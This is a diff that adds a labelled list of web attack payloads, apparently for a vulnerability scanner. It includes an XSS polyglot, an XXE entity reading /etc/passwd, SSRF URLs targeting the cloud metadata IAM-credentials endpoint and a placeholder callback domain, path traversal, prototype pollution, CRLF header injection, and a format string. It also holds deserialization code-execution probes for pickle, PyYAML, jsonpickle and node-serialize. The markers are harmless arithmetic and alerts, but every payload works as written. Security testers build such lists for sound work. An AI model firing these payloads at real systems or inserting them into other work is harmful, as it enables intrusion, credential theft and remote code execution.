@@ -1,0 +1,23 @@
+##POLYGLOT - XSS Cross-Context (Math)##
+'"><img src=x onerror=alert(1337)><!--
+##POLYGLOT - XXE (File Read)##
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+##POLYGLOT - SSRF##
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://{domain}/ssrf
+##POLYGLOT - Path Traversal##
+../../../../../../../etc/passwd
+##POLYGLOT - Prototype Pollution##
+{"__proto__":{"polluted":1337}}
+##POLYGLOT - CRLF/Header Injection##
+%0d%0aX-Injected:1337%0d%0a
+##POLYGLOT - Format String##
+%s%s%s%s%s%s%s%s%s%s
+##Python Pickle P0 - Math (eval 7*191)##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
+##Python YAML - Math (eval 7*191)##
+!!python/object/apply:builtins.eval ["7*191"]
+##Python jsonpickle - Math (eval 7*191)##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}
+##Node node-serialize - Math (return 7*191)##
+{"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
